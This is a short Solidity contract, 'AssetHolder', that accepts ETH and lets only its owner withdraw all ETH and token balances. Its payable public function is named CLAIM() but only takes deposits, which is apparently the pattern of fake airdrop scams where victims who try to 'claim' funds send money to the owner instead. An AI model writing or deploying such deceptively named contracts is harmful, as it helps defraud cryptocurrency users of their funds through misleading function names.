// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.24;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract AssetHolder {
    address public owner;
    event ReceivedETH(address sender, uint256 amount);
    event WithdrawnETH(address to, uint256 amount);
    event WithdrawnToken(address token, address to, uint256 amount);
    event DepositMade(address depositor, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    receive() external payable {
        emit ReceivedETH(msg.sender, msg.value);
    }

    // Explicit deposit function
    function CLAIM() public payable {
        emit DepositMade(msg.sender, msg.value);
    }

    function checkETHBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function checkTokenBalance(address tokenAddress) public view returns (uint256) {
        IERC20 token = IERC20(tokenAddress);
        return token.balanceOf(address(this));
    }

    function withdrawETH() public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH balance");
        emit WithdrawnETH(owner, balance);
        payable(owner).transfer(balance);
    }

    function withdrawToken(address tokenAddress) public onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No token balance");
        emit WithdrawnToken(tokenAddress, owner, balance);
        token.transfer(owner, balance);
    }
}